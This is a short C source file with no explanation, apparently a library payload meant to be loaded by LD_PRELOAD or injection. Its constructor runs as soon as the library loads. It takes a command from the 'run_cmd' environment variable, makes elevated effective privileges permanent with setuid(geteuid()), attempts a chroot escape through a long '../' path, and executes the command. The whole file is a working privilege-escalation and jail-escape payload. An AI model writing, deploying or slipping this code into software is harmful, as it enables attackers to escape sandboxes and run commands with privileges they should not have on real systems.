#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <string.h>

__attribute__((constructor))
static void run(void) {
    const char *cmd = getenv("run_cmd");
    if (cmd == NULL)
        return;
    cmd = strdup(cmd);
    unsetenv("run_cmd");

    printf("Executing %s...\n", cmd);

    if (setuid(geteuid()) != 0)
        perror("setuid");

    if (chroot("../../../../../../../../../..") != 0)
        perror("chroot");

    execlp(cmd, cmd, NULL);
    perror("exec");
}
